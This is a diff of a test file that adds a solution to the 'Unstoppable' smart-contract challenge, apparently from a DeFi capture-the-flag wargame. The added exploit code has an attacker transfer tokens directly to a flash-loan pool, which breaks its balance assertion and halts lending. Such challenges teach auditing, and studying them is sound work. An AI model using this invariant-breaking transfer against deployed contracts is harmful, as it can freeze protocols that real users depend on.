@@ -48,7 +48,22 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
-    });
+        const accounts = await ethers.getSigners();
+        const attacker = accounts[1];
+
+        /*
+         * flashLoan method has a check "assert(poolBalance == balanceBefore);"
+         * We can directly transfer tokens to pool account without calling "depositTokens"
+         * method. In this way we can unqeualize poolBalance and balanceBefore(pool's Tokens)
+         */
+        let tx = await this.token.connect(attacker).transfer(this.pool.address, 10);
+        await tx.wait();
+        console.log(tx);
+
+        let poolBalance = await this.pool.poolBalance();
+        let balanceBefore = await this.token.balanceOf(this.pool.address);
+        expect(poolBalance).to.be.not.eq(balanceBefore);
+  });
 
     after(async function () {
         const accounts = await ethers.getSigners();
